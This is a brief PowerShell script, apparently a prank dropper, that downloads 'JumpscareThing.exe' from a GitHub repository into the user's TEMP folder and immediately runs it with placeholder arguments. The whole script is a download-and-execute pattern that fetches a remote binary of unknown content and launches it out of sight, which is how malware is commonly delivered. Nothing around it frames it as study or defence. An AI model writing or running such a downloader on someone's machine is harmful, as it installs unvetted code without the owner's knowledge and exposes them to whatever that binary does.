$url = "https://github.com/LordRyan1999/JumpscareThing/raw/main/JumpscareThing.exe"
$outpath = "$env:TEMP/JumpscareThing.exe"
Invoke-WebRequest -Uri $url -OutFile $outpath

$args = @("Comma","Separated","Arguments")
Start-Process -Filepath "$env:TEMP/JumpscareThing.exe" -ArgumentList $args
